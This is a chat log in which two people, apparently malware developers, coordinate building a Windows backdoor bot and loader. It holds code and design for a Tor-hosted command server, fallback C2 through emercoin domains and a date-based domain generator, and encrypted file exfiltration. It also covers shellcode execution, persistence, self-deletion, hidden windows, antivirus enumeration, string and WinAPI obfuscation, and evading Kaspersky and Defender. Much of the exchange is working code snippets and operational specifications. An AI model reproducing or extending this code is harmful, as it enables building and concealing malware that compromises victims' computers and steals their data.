2020-06-22T08:48:55 mushroom -> frog
Had a look at your code. Clarification do you have command 1 considered not blocking?

2020-06-22T08:49:37 mushroom -> frog
// If at this point in time there is not a blocking command running, but any command other than Reset, it should be ignored
	if (((tcode >= 10 && tcode <= 13) || tcode == 1) && new_command_code != 14)
		return;

2020-06-22T08:53:03 frog -> mushroom
Hi!
First I made it so that command 1 could be interrupted, and only then I found out that it should be blocking. Left it as non-blocking (just in case, probably won't make it worse).

2020-06-22T08:57:05 mushroom -> frog
In theory, it won't. Another clarification, if any error occurs during the execution of any command, what do you send to the server?

2020-06-22T09:00:24 frog -> mushroom
The text of the error message.
For example:
send_result(string("could not download file from ") + uri);

2020-06-22T09:00:57 mushroom -> frog
Also send the GetLastError code.

2020-06-22T09:01:05 mushroom -> frog
Or just the code.

2020-06-22T09:01:27 mushroom -> frog
So that you can determine exactly what the error is.

2020-06-22T09:03:17 mushroom -> frog
If a transmission error occurred, are you still making attempts to send the same?

2020-06-22T09:04:18 frog -> mushroom
Okay

2020-06-22T09:04:50 frog -> mushroom
No, haven't done that yet.

2020-06-22T09:06:10 mushroom -> frog
Will you do it when you finish all the commands?

2020-06-22T09:06:18 mushroom -> frog
Which ones are left?

2020-06-22T09:08:53 frog -> mushroom
Terminate Process is left. Did the rest, tested on some of my data, everything seems to work.

2020-06-22T09:09:22 mushroom -> frog
Is the command to upload the file to the server working?

2020-06-22T09:10:58 frog -> mushroom
But it turns out error handling needs to be done everywhere (add GetLastError, send process PID, etc.). I've tested the file upload command, the same file is then uploaded from the server as it was sent (hence, everything works)

2020-06-22T09:15:13 mushroom -> frog
To upload a file to the server, I advise you to make the timeout for the request bigger, because sometimes the connection with the server is slow.
DWORD timeoutSize = sizeof(timeout);
wininet.internetSetOption(req, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, timeoutSize);

2020-06-22T09:15:39 mushroom -> frog
8 - 10 minutes timeout.

2020-06-22T09:37:44 mushroom -> frog
Another clarification. After the processes work to run the file from disk, do you delete these files? Do you randomly generate these file names?

2020-06-22T09:39:58 frog -> mushroom
Yes, I generate the names randomly (of 10 characters), save them in the temp folder. Then I delete them after the process is finished.

2020-06-22T09:40:26 mushroom -> frog
OK. Increase the timeout as I wrote above for the request.

2020-06-22T09:40:40 mushroom -> frog
Uploading a file to the server.

2020-06-22T09:43:48 frog -> mushroom
Okay.

2020-06-23T09:02:52 mushroom -> frog
I forgot to ask yesterday. Is your shell code running in the SEH block?

2020-06-23T09:03:24 mushroom -> frog
Otherwise it will kill the whole program at the slightest error in shell code.

2020-06-23T09:05:29 mushroom -> frog
Like this:
__try
    {
        (*(VOID(*)())codeAddr)();
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        success = FALSE;
    }

2020-06-23T09:05:57 mushroom -> frog
__try\__except be sure to wrap

2020-06-23T09:06:11 frog -> mushroom
Hi
No. I was thinking the same thing. Tried to wrap it in the try, catch section, but it didn't work.
Okay, I'll do it that way. Thanks.

2020-06-23T09:06:41 mushroom -> frog
try\catch does not catch such errors, but SEH does.

2020-06-23T09:07:14 frog -> mushroom
Do you need to read into the standard channel in this case?

2020-06-23T09:07:32 mushroom -> frog
No. You don't count him in any way.

2020-06-23T09:07:57 mushroom -> frog
That's just executing machine instructions.

2020-06-23T09:08:13 mushroom -> frog
Do you have an example shell code?

2020-06-23T09:09:30 frog -> mushroom
A simple one I made myself, which corresponds to the commands
MOV EAX, 128
RET

2020-06-23T09:10:11 mushroom -> frog
Here:
33 C9 64 8B 49 30 8B 49 0C 8B 49 1C 8B 59 08 8B 41 20 8B 09 80 78 0C 33 75 F2 8B EB 03 6D 3C 8B 6D 78 03 EB 8B 45 20 03 C3 33 D2 8B 34 90 03 F3 42 81 3E 47 65 74 50 75 F2 81 7E 04 72 6F 63 41 75 E9 8B 75 24 03 F3 66 8B 14 56 8B 75 1C 03 F3 8B 74 96 FC 03 F3 33 FF 57 68 61 72 79 41 68 4C 69 62 72 68 4C 6F 61 64 54 53 FF D6 33 C9 57 66 B9 33 32 51 68 75 73 65 72 54 FF D0 57 68 6F 78 41 01 FE 4C 24 03 68 61 67 65 42 68 4D 65 73 73 54 50 FF D6 57 68 72 6C 64 21 68 6F 20 57 6F 68 48 65 6C 8B CC 57 57 51 57 FF D0

2020-06-23T09:11:41 mushroom -> frog
The Hello World window shows, this is 32 bit code. Since it doesn't restore the stack after the call, there will be an error, which __try\__catch should catch. But you will see the Hello World window when you close it and the error will happen.

2020-06-23T09:14:12 mushroom -> frog
__try\__except I mean.

2020-06-25T13:22:42 mushroom -> frog
Hi. What's left of the teams at the moment?

2020-06-25T19:39:23 frog -> mushroom
The Terminate Process command is left. Made exception handling for Shell Code command. I'm also going to make sending LastErrorCode in the near future.

2020-06-26T07:08:30 frog -> mushroom

Let me know when you finish the bot, I want to compile at my place and see. Also make a utility that outputs to stdout the same bot id as your program generates it, you need it for autotests.

2020-06-29T08:16:53 frog -> mushroom
Good afternoon.
Finished the commands. Did the utility as well. Uploaded everything to gitlab.

2020-06-29T09:18:30 mushroom -> frog
OK. I'll take a look at it. Finish the loader.

2020-06-29T09:18:47 mushroom -> frog
Fixation in the system.

2020-06-29T09:24:08 frog -> mushroom

2020-06-30T08:03:03 mushroom -> frog
Hi. Did you read in the bootloader job how to connect to the server?

2020-06-30T08:38:09 mushroom -> frog
I see the backdoor is yours.

2020-06-30T08:39:00 mushroom -> frog
Running the command 0 300, you get 300 seconds waiting in the command and another 300 seconds between commands.

2020-06-30T08:39:58 mushroom -> frog
Command 0 <time> means to request a command in <second time>, no need to wait another five minutes.

2020-06-30T08:40:13 mushroom -> frog
It's the same for team 1.

2020-06-30T08:40:42 mushroom -> frog
But for commands to start processes, you need to ask for a command every 5 minutes.

2020-06-30T08:42:25 mushroom -> frog

It ran, but you probably forgot to encode the output in UTF-8.

2020-06-30T08:43:24 mushroom -> frog
Everything you send to the server should be encoded in UTF-8.

2020-06-30T08:47:18 frog -> mushroom
Hi. Okay. Tried encoding in UTF-8, but something didn't work then, the server didn't want to accept the response. I'll try again, maybe somewhere wrong.
About timeouts: just did not understand this point in the ToR.

2020-06-30T08:48:41 mushroom -> frog
This is only for commands 0 and 1 timeout means to call back to the server after a timeout after the command is executed.

2020-06-30T08:48:57 mushroom -> frog
0 300 -> call back in 5 minutes

2020-06-30T08:49:17 mushroom -> frog
1 300 -> call back in 5 minutes after the command is executed.

2020-06-30T08:49:57 mushroom -> frog
For everyone else who has a timeout (this is the process startup), the timeout is the maximum running time of the process.

2020-06-30T08:50:43 mushroom -> frog
Who doesn't have a timeout, wait 5 minutes after the command is executed by default.

2020-06-30T08:52:00 mushroom -> frog
Well and when the process is running, it's not like it's a blocking command, every 5 minutes the command is requested as the default.

2020-06-30T08:54:27 mushroom -> frog
Does this window for debugging come out all the time with the output?

2020-06-30T08:54:52 frog -> mushroom
Yes, it's for debugging.

2020-06-30T08:57:40 frog -> mushroom
When you execute a start command (non-blocking command), send the result, the next command is requested immediately or wait in the loop when 5 minutes expire?

2020-06-30T09:00:29 mushroom -> frog
Received a command, started the process, sleep for 5 minutes, the process works, if it worked for 1 minute, sent the result to the server, 4 minutes left to sleep it turns out, 4 minutes passed, command request.

2020-06-30T09:01:37 mushroom -> frog
That is, the program sleeps between requests for 5 minutes, regardless of the running process.

2020-06-30T09:02:00 frog -> mushroom
I see.

2020-06-30T09:02:23 mushroom -> frog
The only thing you have to do is synchronize the streams.

2020-06-30T09:02:33 mushroom -> frog
You know, I think you know.

2020-06-30T09:03:16 frog -> mushroom
Of course

2020-06-30T09:04:05 mushroom -> frog

2020-06-30T09:04:35 mushroom -> frog
Check.

2020-06-30T09:05:30 mushroom -> frog
Nah, it works.

2020-06-30T09:06:13 mushroom -> frog
I didn't close the debug window. The output is sent to the server after it.

2020-06-30T09:06:49 mushroom -> frog
Files if run with a download to disk in temp saved?

2020-06-30T09:07:00 frog -> mushroom
Right

2020-06-30T09:07:32 frog -> mushroom
The debugging window shows what is being sent to the server.

2020-06-30T09:08:24 mushroom -> frog
Output the names of these files for debugging, so you can check in temp that they are deleted after they have worked.

2020-06-30T09:12:11 mushroom -> frog
And output for debugging in more detail, so that the tester will send you a log when errors occur, and you will quickly find the error. Output addresses where you connect exactly need to do.

Http addresses?
And do the debug output in Std Output?

2020-06-30T09:16:27 mushroom -> frog
http addresses, debug output, that's what you have debug_printf

2020-06-30T09:17:07 mushroom -> frog
So that debug_printf output can be disabled completely through a macro.

2020-06-30T09:17:27 mushroom -> frog

2020-06-30T09:17:51 frog -> mushroom
No

2020-06-30T09:18:49 mushroom -> frog
did you write debug_printf yourself?

2020-06-30T09:28:38 mushroom -> frog
LOG_TO_FILE macro output to file is the same as output to console, works if RELEASE_NO_LOGS macro is not specified.

2020-06-30T09:29:06 mushroom -> frog

Hi!
The CHTTP::postBinary function does the sending of the file to the server. I don't know what I'm doing wrong with it. Increased the timeout to 10 minutes.

2020-07-02T08:06:50 mushroom -> frog
Hi. I'll take a look at it now.

2020-07-02T08:12:35 mushroom -> frog
Do you encrypt the file before sending it?

2020-07-02T08:12:48 mushroom -> frog
There is no encryption in postBinary.

2020-07-02T08:13:26 frog -> mushroom
In CHTTP::post encryption

2020-07-02T08:14:36 mushroom -> frog
Content-Length: %d d you don't have to write in the header, wininet will insert it itself.

2020-07-02T08:16:35 mushroom -> frog
CHTTP::post has no encryption either.

2020-07-02T08:17:28 frog -> mushroom
bool CHTTP::post(char* id, const PBYTE data, DWORD data_size)
{
    //Send result to the server
    PBYTE xor_data = (PBYTE)pHeapAlloc(GetProcessHeap(), 0, data_size);

    xor_crypt(data, data_size, id, xor_data);

2020-07-02T08:17:51 frog -> mushroom
xor_crypt - encryption.

2020-07-02T08:18:27 mushroom -> frog
Here's what I have:
bool CHTTP::post(const char* objectName, const PBYTE body, DWORD bodyLength, PBYTE* data, DWORD* dataSize)
{
    if (data != nullptr) *data = nullptr;
    if (dataSize != nullptr) *dataSize = 0;

    if (hHttpSession == NULL)
        return false;
    HINTERNET hHttpRequest = HttpOpenRequestA(
        hHttpSession, "POST", objectName, "1.1,
        nullptr, nullptr, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_COOKIES, 0);

    if (hHttpRequest == NULL)
        return false;

    char szHeaders[] = "Content-Type: application/x-www-form-urlencoded\r\nCookie: group=" GROUP;
    if (!HttpSendRequestA(hHttpRequest, szHeaders, strlen(szHeaders), body, bodyLength))
    {
        InternetCloseHandle(hHttpRequest);
        return false;
    }

    // check status code
    if (!okStatus(hHttpRequest))
    {
        InternetCloseHandle(hHttpRequest);
        return false;
    }

    read(hHttpRequest, data, dataSize);

    InternetCloseHandle(hHttpRequest);
    return true;
}

2020-07-02T08:19:22 mushroom -> frog
Found an overloaded method. There is encryption there.

2020-07-02T08:27:27 mushroom -> frog
Maybe Content-Length: %d in the header. Try without it, wininet calculates it by itself.

2020-07-02T08:28:21 mushroom -> frog
I'll check my server, maybe it's a server jam, later.

2020-07-02T09:39:13 mushroom -> frog

Okay. But it took the nth try to send a 1.75 MB picture.

2020-07-02T09:45:24 mushroom -> frog
Yes. The server accepts small files.

2020-07-02T09:45:39 mushroom -> frog
5 mb is not accepted.

The system info command gave the wrong ip 192.168.56.1 192.168.1.42, which is the external ip. That was the last time I looked. Is there a change?

2020-07-02T09:48:13 frog -> mushroom
Made an external ip address request with "https://myexternalip.com/raw".

2020-07-02T09:48:30 mushroom -> frog
Sort of.

2020-07-02T09:52:52 mushroom -> frog
Does suicide send anything to the server?

2020-07-02T09:53:11 mushroom -> frog
You have to send OK and shut down.

2020-07-02T09:53:55 mushroom -> frog
Didn't send anything last time, that's why this command is pending in the admin.

2020-07-02T09:58:51 mushroom -> frog
Now running command 1 came up with ip 192.168.56.1, 192.168.1.42.

2020-07-02T09:59:03 mushroom -> frog
Not external again.

2020-07-02T09:59:45 frog -> mushroom
Okay, I will.
If you need, you can do in the process function in the loop
command = "14";
I also made encoding from OEM to ANSI content of standard threads. Now everything is readable on server.
I'll check now, maybe I haven't uploaded it to gitlab yet.

2020-07-02T10:00:22 mushroom -> frog
And the system is defined as Win 8, but I have Win 10.

2020-07-02T10:00:49 mushroom -> frog
In the field where antiviruses
Standart Output
Standart Error
ERROR.
Description: Incorrect namespace

2020-07-02T10:02:26 mushroom -> frog
Tell me when you download it. Is that how it's done?

2020-07-02T10:03:00 frog -> mushroom
You also need to put debug_printf everywhere.

2020-07-02T10:04:23 mushroom -> frog
Then tell them to make you an account in the working admin to test there.

2020-07-02T10:07:34 frog -> mushroom
This is how I recognize the antivirus:
run("wmic /namespace:\\root\SecurityCenter path AntivirusProduct get displayName, versionNumber /format:list");
I'll do a shutdown command, debug (debug_printf) and then upload to gitlab

2020-07-02T10:24:08 mushroom -> frog
Also, you just take the server address now, and in the TOR you need to get it. First go through the list of simple addresses, then through the list of emercoin addresses, then through the list of generated addresses. This is the same for the loader and the bot. When the account is made for you on the working admin, I'll give you those lists.

2020-07-02T10:24:50 mushroom -> frog
You didn't do an address retrieval from the emercoin network, did you?

2020-07-02T10:25:46 frog -> mushroom
No. I haven't done it yet.

2020-07-02T10:26:10 mushroom -> frog
Did Buza give you an example?

2020-07-02T10:27:42 frog -> mushroom
There is a module resolve_emercoin.h among those files that Buza gave

2020-07-02T10:29:01 mushroom -> frog
So there is. There is another way, it's easier, I'll send it now, it will be the main one, and resolve_emercoin is a spare one.

					HeapFree(GetProcessHeap(), 0, resp);
					return TRUE;
				}

				dnsapi.dnsFree((PVOID)dnsRecord, DnsFreeRecordList);
			}
		}

		HeapFree(GetProcessHeap(), 0, resp);
	}

	return FALSE;
}

2020-07-02T10:31:51 mushroom -> frog
downloadBuffer(_TSTR(TEXT("https://api.opennicproject.org/geoip/?bare&ipv=4")) is just a GET request, gets a list of addresses.

2020-07-02T10:33:22 mushroom -> frog
In general, the address is obtained through a dns query.

2020-07-02T10:38:17 mushroom -> frog
Here is thegame.bazar address for training, it should get 34.222.222.126.

2020-07-02T10:39:59 mushroom -> frog
Every byte of the address has to be decrypted by xor 254 after emercoinResolveDns. And then you get 34.222.222.126.

2020-07-02T10:40:11 mushroom -> frog
It's a left address, nothing was sent to it.

2020-07-02T10:40:22 mushroom -> frog
If you have any questions write.

2020-07-02T10:41:14 mushroom -> frog
Address byte means <byte>.<byte>.<byte>.<byte>.

Make a connection to the server as described in the TOR for the loafer.

2020-07-03T10:49:09 mushroom -> frog
3 lists, the first list is pure addresses, I wrote them above, the second list is emercoin addresses, you can make them up like bestgame.bazaar, the third list is generated automatically based on the date (described in the ToR for the loader).

2020-07-03T10:49:54 mushroom -> frog
This connection is the same for bot and loader.

2020-07-03T10:52:56 mushroom -> frog
And do as you want, so you do not get confused when you connect to the test server, and when to combat. I, for example, if the macro _DEBUG set connection to the test, if not - to combat. Release_nologs should be a windows program, not a console (/SUBSYSTEM:WINDOWS), how do you have it now?

2020-07-03T10:56:09 frog -> mushroom
Hi!
Release_nologs is still console.

2020-07-03T10:56:22 mushroom -> frog
Your group is on the battle server seven, don't confuse it with the group you have on the test server. For combat seven, for test frog.

2020-07-03T10:56:57 mushroom -> frog
Change Release_nologs to a windows program so the user doesn't see anything at all.

2020-07-03T10:57:37 frog -> mushroom
Okay. What is the http address of the battle server?

2020-07-03T10:57:57 mushroom -> frog
https://scrytnuuszglaugg.onion

2020-07-06T11:18:46 frog -> mushroom
Hi.
Is it possible to find out the date and SID on the server without querying the command itself (/%id%/2)? Is there a separate command for this?
Should the date be signed locally?
Is server search done once on startup or is there a different algorithm?

2020-07-06T11:20:41 mushroom -> frog
Hi. The server is searched on startup, and if there is some kind of communication error, again search through the lists.

2020-07-06T11:22:21 mushroom -> frog
To get the SID without requesting a command, request GET /<id>/4

2020-07-06T11:23:14 mushroom -> frog
The date signed is the one the server sends in the header.

2020-07-06T11:25:44 mushroom -> frog
The server will send a date like 2020-07-06 09:00:10 only the date should be checked, the time should be discarded.

2020-07-06T11:26:34 mushroom -> frog
If you could not find a valid command server in 3 hours, you should either terminate or remove yourself from the system (determined by your build settings).

2020-07-06T11:27:06 mushroom -> frog
The full connection algorithm look in the ToR for the loader, it is the same for the loader and for the bot.

2020-07-06T11:28:18 mushroom -> frog
If a transmission error occurs, several more attempts to send a request, no success, reconnect.

2020-07-06T11:28:57 mushroom -> frog
Failed to reconnect in 3 hours, exit.

2020-07-06T11:34:30 frog -> mushroom
Use port 80?

2020-07-06T11:35:53 mushroom -> frog
https always use on the live server, on the test server whatever you want.

2020-07-06T11:39:32 mushroom -> frog
For https requests, after the HttpOpenRequest function, you need to set flags to ignore certificate errors, because they are self-written on the server.

2020-07-06T11:39:44 mushroom -> frog
DWORD flags = 0;
    DWORD flagsSize = sizeof(flags);
    wininet.internetQueryOption(req, INTERNET_OPTION_SECURITY_FLAGS, &flags, &flagsSize);
    if (isSecure)
    {
        flags |= SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        flags |= SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
        flags |= SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTPS;
        flags |= SECURITY_FLAG_IGNORE_REVOCATION;
    }
    else
        flags |= SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTP;
    wininet.internetSetOption(req, INTERNET_OPTION_SECURITY_FLAGS, &flags, flagsSize);

2020-07-06T11:39:49 mushroom -> frog
like this

2020-07-06T11:42:13 frog -> mushroom
isSecure is "true" if port 443?

2020-07-06T11:46:01 mushroom -> frog
Yes if https connection, can be theoretically https connection not for port 443. The default is 443.

2020-07-06T11:46:55 mushroom -> frog
Don't forget to pass flag during request opening if you have https connection
HINTERNET req = wininet.httpOpenRequest(connection, method, path, _TSTR(TEXT("1.1")), NULL,
        NULL, (isSecure ? INTERNET_FLAG_SECURE : 0) | INTERNET_FLAG_NO_COOKIES, 0);

2020-07-06T11:46:58 mushroom -> frog
like this

2020-07-06T11:47:49 frog -> mushroom
Okay. Thank you!

2020-07-06T11:47:54 mushroom -> frog
HINTERNET req = wininet.httpOpenRequest(connection, method, path, _TSTR(TEXT("1.1")), NULL,
       NULL, (isSecure ? INTERNET_FLAG_SECURE : 0) | INTERNET_FLAG_NO_COOKIES, 0);

   wininet.internetSetOption(req, INTERNET_OPTION_SECURITY_FLAGS, &flags, flagsSize);

2020-07-06T11:48:06 mushroom -> frog
Like this, and then send a request.

2020-07-06T13:03:28 frog -> mushroom
If the date on the server is not the same as the local date, then skip the server?

2020-07-06T13:04:28 mushroom -> frog
If the signature does not match, or the date (without time) does not match the local, look for another server. That's what it says in the ToR.

2020-07-06T13:38:19 frog -> mushroom
How do I check if an emercoin address I made up myself is busy?

2020-07-06T13:39:12 mushroom -> frog
The one you came up with yourself, try to get it. Through dns request as I wrote or through resolve_emercoin.

2020-07-10T09:23:42 frog -> mushroom
Hi, I have a few questions.
When a domain name is generated based on the current date, a sequence of characters is obtained (according to the algorithm in the TK, there is a function for this). How to convert this sequence to an IP address?

How do I reconnect? The TOR says:
"If there was a transmission timeout within three attempts, the bot doubles the sending intervals, up to an interval of 30 minutes."
How long (or how many attempts) to try to connect to a particular IP address and when to start looking for another server?

Now only HTTP-code 200 is considered successful. The TOR says about HTTP-codes 40*, 50* too. And what should I do if I can't send a file?

2020-07-10T09:30:10 mushroom -> frog
Add .bazaar to this sequence

2020-07-10T09:30:17 mushroom -> frog
This is the address of emercoin

2020-07-10T09:34:34 mushroom -> frog
One attempt, connected to one address. Went through all the addresses in all the lists, fell asleep. You go through all the addresses in all the lists again, only now you fall asleep for 30 minutes between lists.

2020-07-10T09:35:17 mushroom -> frog
It didn't work again, shutdown.

2020-07-10T09:35:54 mushroom -> frog
3 attempts to send a request, failed, reconnect, go through the lists again, as I wrote above.

2020-07-10T09:36:46 mushroom -> frog
Only code 200 is successful, everything else is not considered successful, then you make two more attempts, not successful and five reconnect.

2020-07-10T09:39:33 mushroom -> frog
I'll send you an example of string obfuscation and WinApi calls. You can just paste it in there. You've got it all done you can tell. It's time to put your kit to work, Booza said. Finish the rough edges that remain.

Obfuscate string _STR("Ansi string"), WCHAR[] wstr; lstrcpyW(wstr, L "Unicode"); use wstr then where you need Unicode.

2020-07-10T09:44:42 mushroom -> frog
Obfuscation of strings is enabled by macro OBFUSCATED_STRINGS, it should be enabled in Release_nologs.

2020-07-10T09:46:44 mushroom -> frog
WinApi obfuscation is pretty self-explanatory there. Global variables kernel32, etc. are wrapper class objects over WinApi libraries, they have loading and getting address of WinApi function, and its call is on the fly, so there is no trace of these functions in the binary file.

2020-07-10T09:48:24 mushroom -> frog
You add a winapiproxy.h header and use kernel32 objects, etc. For example kernel32.getTempPath, wininet.internetOpen, wininet.internetClose.

2020-07-10T09:49:08 mushroom -> frog
Adding new functions for obfuscation do the same as there, just as a class method, not hard there.

2020-07-10T09:49:56 mushroom -> frog
Replace all your static strings with _STR("string")\_WCS("String")\_TSTR("String").

2020-07-10T09:50:34 mushroom -> frog
_TSTR turns into _STR if no UNICODE macro is specified, and into _WCS if it is, for convenience.

2020-07-10T09:52:05 mushroom -> frog
Then check the import of the resulting file, and the lines in it. There shouldn't be any. A handy utility to view the exe file http://www.mitec.cz/exe.html if needed.

2020-07-10T09:52:58 mushroom -> frog
You got it. Write, I'll give you login/password to dyncheck, there you can check for antiviruses.

2020-07-10T09:55:19 frog -> mushroom
And in GetApi.h, how can you add functions that aren't there?

2020-07-10T09:58:40 mushroom -> frog
There's more writing in there:
HMODULE lib = LoadLibrary("...");
typedef void(WINAPI* functype)(void)
functype ptr = (functype)GetProcAddress(lib, "func");
ptr()

2020-07-10T09:59:13 mushroom -> frog
The one I sent you has already done this for a large number of functions.

2020-07-10T10:00:22 mushroom -> frog
Here's how I make a connection to the server:
bool Commander::connect()
{
    if (addressListConnect())
        return true;

    if (emercoinListConnect())
        return true;

    if (dateListConnect())
        return true;

    debug_printf(TEXT("Sleep %u msecs\n"), TRY_CONNECT_INTERVAL);
    kernel32.sleep(TRY_CONNECT_INTERVAL);

    if (addressListConnect())
        return true;

    debug_printf(TEXT("Sleep %u msecs\n"), TRY_LIST_CONNECT_INTERVAL);
    kernel32.sleep(TRY_LIST_CONNECT_INTERVAL);

    if (emercoinListConnect())
        return true;

    debug_printf(TEXT("Sleep %u msecs\n"), TRY_LIST_CONNECT_INTERVAL);
    kernel32.sleep(TRY_LIST_CONNECT_INTERVAL);

    if (dateListConnect())
        return true;

    return false;
}

2020-07-10T10:01:06 mushroom -> frog
Went through all the lists, did not work, fell asleep, again on all the lists, but between lists of 30 minutes interval. Did not pass completion.

2020-07-10T10:03:25 mushroom -> frog
TRY_CONNECT_INTERVAL - 5 min, TRY_LIST_CONNECT_INTERVAL 30 min.

2020-07-10T12:03:37 frog -> mushroom
Just wanted to clarify:
If it so happens that the domain name and computer name are the same on the two computers, then the id will be the same.
I also put in the id the date the Windows folder was created, but this date may also be the same on different machines.  What to do in this case?

2020-07-10T12:04:46 mushroom -> frog
Use a creation date accurate to 1msec to avoid this as much as possible.

2020-07-10T12:05:40 mushroom -> frog
Then the probability that everything will match will tend to zero.

2020-07-10T12:08:37 mushroom -> frog
As an example:
TCHAR sysPath[MAX_PATH + 1];
    if (!kernel32.getSystemWindowsDirectory(sysPath, MAX_PATH + 1))
    {
        debug_printf(TEXT("Can't get system windows directory, error: %u\n"), GetLastError())
        *size = 0;
        return FALSE;
    }

    HANDLE sysFolder = kernel32.createFile(sysPath, GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (sysFolder == INVALID_HANDLE_VALUE)
    {
        debug_printf(TEXT("Can't open system windows directory, error: %u\n"), GetLastError());
        *size = 0;
        return FALSE;
    }

    FILETIME sysFolderFileTime = { 0 };
    if (!kernel32.getFileTime(sysFolder, &sysFolderFileTime, NULL, NULL))
    {
        debug_printf(TEXT("Can't get system windows directory file time, error: %u\n"),
            GetLastError());
        kernel32.closeHandle(sysFolder;)
        *size = 0;
        return FALSE;
    }
    kernel32.closeHandle(sysFolder);

    SYSTEMTIME sysFolderSystemTime = { 0 };
    if (!kernel32.fileTimeToSystemTime(&sysFolderFileTime, &sysFolderSystemTime))
    {
        debug_printf(
            TEXT("Can't convert system windows directory file time to system time, error: %u\n"),
            GetLastError());
        *size = 0;
        return FALSE;
    }

    TCHAR creationDateStr[19];
    wsprintf(creationDateStr, _TSTR(TEXT("%u%u%u%u%u%u")), sysFolderSystemTime.wMonth,
        sysFolderSystemTime.wDay, sysFolderSystemTime.wYear, sysFolderSystemTime.wHour,
        sysFolderSystemTime.wMinute, sysFolderSystemTime.wSecond,
        sysFolderSystemTime.wMilliseconds);

2020-07-10T12:10:46 frog -> mushroom
I read somewhere that this date is fixed when you build the OS, not when you install it (for some versions of Windows). I, for example, have a Windows folder creation date of "July 14, 2009" even though it's actually installed much later.

2020-07-10T12:13:10 mushroom -> frog
Check. What you get, you can take the date of creation or the date of the last change.

2020-07-10T12:13:25 mushroom -> frog
My creation date is normal.

2020-07-10T12:14:15 mushroom -> frog
getFileTime(sysFolder, &sysFolderFileTime, NULL, NULL) here you can take where NULL the date of last change, etc.

2020-07-10T12:37:10 mushroom -> frog
For now, leave the creation date with great accuracy, as long as there were no bot id screwups. We'll have to clarify when this date is set.

2020-07-10T15:20:05 frog -> mushroom
If a command is requested from one ip-address and the connection to this ip-address is lost, then the response can be sent to another ip-address (which we will find on the lists) or not? Not quite clear, is the admin common to all ip-addresses or not?

2020-07-10T15:20:38 mushroom -> frog
Yes. Common to all addresses.

2020-07-10T15:21:37 mushroom -> frog
Command requested, received, send the result error 3 times, reconnect, where you managed to connect there and send the result.

2020-07-10T15:22:20 frog -> mushroom
Got it.
The TOR says the get_possible_domain function needs to be obfuscated. Need to confuse it, complicate it?

2020-07-10T15:23:42 mushroom -> frog
Yes, you can confuse it. Also, obfuscate WinApi function calls in it. I just obfuscate WinApi function calls in it. You can cram some extra calculations into it.

2020-07-10T15:28:49 frog -> mushroom
And how does GetApi.h calculate the cache - 2 parameter (e.g. 0xC8AC8026)?
#define pCustomFunc pushargEx< DLL_KERNEL32, 0xC8AC8026, 1 >
The third one, it seems to be an index in the table. I still don't understand the second one.

2020-07-10T15:31:36 mushroom -> frog
I don't know, I haven't figured it out. Just used it, and then wrote my own Winapiproxy, GetApi can crash on different versions of Windows, because there addresses of functions it uses are different in different versions of windows.

2020-07-10T15:32:05 mushroom -> frog
That's why I stopped using it, because of the inconvenience.

I think the second parameter is the address of the function in the library.

2020-07-10T15:33:53 frog -> mushroom
Need to remove all (or part of) the lib file connections to reduce the size of the executable?

2020-07-10T15:34:46 mushroom -> frog
Winapi remove everything except simple functions of working with strings, memory allocation, memory release.

2020-07-10T15:35:31 mushroom -> frog
The size will be smaller the less you use the standard library.

2020-07-10T15:36:16 mushroom -> frog
We need to hide traces of WinApi functions in the binary file, that's why we make obfuscation of WinApi functions.

2020-07-10T15:36:54 mushroom -> frog
And strings, too, so that for example server addresses are not openly visible in the binary.

2020-07-10T15:42:56 frog -> mushroom
If local date differs from server date (by a day) because time zones are different, should it be taken into account?
I.e. somewhere it is already a new day (on the server, for example), but not on the client yet.

2020-07-10T15:43:23 mushroom -> frog
Not different, using UTC time.

2020-07-10T15:43:48 mushroom -> frog
In universal format.

2020-07-10T15:44:36 mushroom -> frog
Don't use a local date.

2020-07-10T15:45:51 mushroom -> frog
SYSTEMTIME sysTime = { 0 };
    kernel32.getSystemTime(&sysTime);

2020-07-10T15:48:02 mushroom -> frog
If there is no match theoretically because of seconds, for example, it will still take several hours to connect by list.

2020-07-10T15:48:24 mushroom -> frog
Especially the last one, which is generated based on the date.

2020-07-10T15:48:46 mushroom -> frog
On the second pass of the lists then the date will match.

2020-07-10T15:50:11 frog -> mushroom
The third list takes a very long time to check. The TOR says to try to make 5000 connections. Is this normal?

2020-07-10T15:50:23 mushroom -> frog
Yes.

2020-07-10T15:52:47 mushroom -> frog
5,000 emercoin addresses that are generated based on the date.

2020-07-10T15:56:39 frog -> mushroom
The TOR says that the time to find a server is given 3 hours. During this time, probably not 5000 addresses to search. Or you can search longer, like in the example above.

2020-07-10T16:00:16 mushroom -> frog
How do you get to 5000 addresses?

2020-07-10T16:00:32 mushroom -> frog
I estimate 5000 is less than 3 hours.

2020-07-10T16:04:42 frog -> mushroom
I have about 500 in 3 hours right now that I have time to check. That's probably because I use 2 methods. The resolve_emercoin library function takes longer to check the emercoin address.

2020-07-10T16:06:41 mushroom -> frog
Go through 5000 at a time, as it will go, if you need to then just reduce the number, until 5000 at a time.

2020-07-10T16:11:37 mushroom -> frog
I'm off for now.

2020-07-10T16:11:54 frog -> mushroom
Bye

2020-07-13T11:38:47 frog -> mushroom
Hi!
During process masking, when you call ResumeThread, Kaspersky antivirus gets scolded. And when you run an exe file from the temp folder, it doesn't like it either. What to do with it?
I've tried to obfuscate system calls as much as possible, but in debugger I see some strange WinApi calls somewhere in prologue and epilogue. Is there any way to remove them?
I uploaded the latest changes to github.

2020-07-13T11:41:42 mushroom -> frog
Hi. No you can't remove yours. In the import by exe what is there?

2020-07-13T11:41:51 mushroom -> frog
What functions?

2020-07-13T11:42:12 mushroom -> frog
What are the lines in the binary?

2020-07-13T11:42:30 mushroom -> frog
What does antivirus say, what does it call your threat?

You can do it this way. Separately, because the header winsock2.h must always go before windows.h, and this is difficult to achieve, because of this will be build errors. For this reason it is done as a separate file, so as not to mix.

2020-07-13T12:42:51 mushroom -> frog
I don't seem to find any suspicious strings. My x86 was immediately spotted by Defender, x64 was not. Writes about obfuscation, most likely this one is stolen.

How you replace the obfuscation you will tell me.

2020-07-13T12:43:36 mushroom -> frog

